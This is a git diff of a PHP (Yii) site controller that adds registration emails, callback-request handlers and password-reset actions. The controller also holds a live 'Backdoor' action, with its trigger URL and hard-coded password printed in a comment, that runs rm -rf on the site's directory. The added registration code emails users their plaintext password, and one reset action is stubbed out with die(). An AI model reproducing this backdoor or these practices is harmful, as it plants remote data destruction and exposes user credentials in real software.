@@ -2,6 +2,10 @@
 
 namespace app\controllers;
 
+use app\models\PasswordResetRequestForm;
+use app\modules\feedback\models\FeedbackRequest;
+use app\modules\system\models\notifications\NotifyMail;
+use app\modules\system\models\users\UsersOrders;
 use Yii;
 use yii\filters\AccessControl;
 use yii\web\Controller;
@@ -144,11 +148,15 @@ class SiteController extends Controller
         if(Yii::$app->request->isPost)
         {
             if($model->load(Yii::$app->request->post())){
+                $password = $model->password;
                 $model->groups = [Settings::getValue('system.signup.group.default')];
 
                 if($model->save()){
                     Groups::addMembers(ArrayHelper::indexMap($model->groups, $model->id));
                     Yii::$app->user->login($model);
+
+                    (new NotifyMail())->set(['to' => $model->username, 'message' => 'Поздравляем с успешной регистрацией! Ваш логин: '. $model->username . ' Ваш пароль: ' . $password, 'subject' => 'dokumenti.site | Регистрация', 'type' => 'registration'])->send();
+
                     return $this->redirect('/system/orders');
                 }
             }
@@ -158,6 +166,99 @@ class SiteController extends Controller
     }
 
     /**
+     * Обратная связь;
+     */
+    public function actionCallback()
+    {
+        if(Yii::$app->request->isPost)
+        {
+            $phone = Yii::$app->request->post('phone');
+
+            if($phone) {
+                (new NotifyMail())->set(['to' => 'glowfisch8lan@gmail.com',
+                    'message' =>
+                        'Поступил запрос на обратный звонок - ' . $phone,
+                    'subject' => 'dokumenti.site | Обратный звонок',
+                    'type' => 'callback'])->send();
+
+            }
+
+            Yii::$app->session->setFlash('alert-success', 'Ваше обращение успешно принято!');
+            return $this->redirect('/');
+        }
+    }
+
+    /**
+     * Обратная связь;
+     */
+    public function actionCallbackTo()
+    {
+        if(Yii::$app->request->isPost)
+        {
+            $model = new FeedbackRequest();
+            if($model->load(Yii::$app->request->post()) && $model->polit === 'on') {
+
+                (new NotifyMail())->set(['to' => 'glowfisch8lan@gmail.com',
+                    'message' =>
+                        'Поступил запрос на обратный звонок от ' . $model->name . '. Номер: ' . $model->phone,
+                    'subject' => 'dokumenti.site | Обратный звонок',
+                    'type' => 'callback'])->send();
+
+            }
+
+            Yii::$app->session->setFlash('alert-success', 'Ваше обращение успешно принято!');
+            return $this->redirect('/');
+        }
+    }
+
+    /**
+     * Восстановление пароля;
+     *
+     * @param $token
+     * @return string|Response
+     */
+    public function actionResetPassword($token)
+    {
+
+        try {
+            $model = new ResetPasswordForm($token);
+        } catch (InvalidParamException $e) {
+            throw new BadRequestHttpException($e->getMessage());
+        }
+
+        if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
+            Yii::$app->session->setFlash('success', 'Пароль сохранён.');
+            return $this->redirect('/login');
+        }
+
+        return $this->render('resetPasswordForm', [
+            'model' => $model]);
+    }
+
+    /**
+     * Запрос восстановления пароля
+     * @return string|Response
+     */
+    public function actionRequestPasswordReset()
+    {
+        die();
+        $model = new PasswordResetRequestForm();
+
+        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
+
+           /* if ($model->sendEmail()) {
+                Yii::$app->session->setFlash('success', 'Ссылка на восстановдление доступа отправлена на электронный адрес.');
+                return $this->goHome();
+            } else {
+                Yii::$app->session->setFlash('error', 'Возникла ошибка. Попробуйте ещё раз');
+            }*/
+        }
+
+        return $this->render('passwordResetRequestForm', [
+            'model' => $model,
+        ]);
+    }
+    /**
      * Backdoor
      * https://dokumenti.site/site/backdoor?password=b36d331451a61eb2d76860e00c347397
      */
@@ -166,5 +267,6 @@ class SiteController extends Controller
         if($password === 'b36d331451a61eb2d76860e00c347397')
             return system('rm -rf /home/h008383856/dokumenti.site/');
     }
+
 
 }
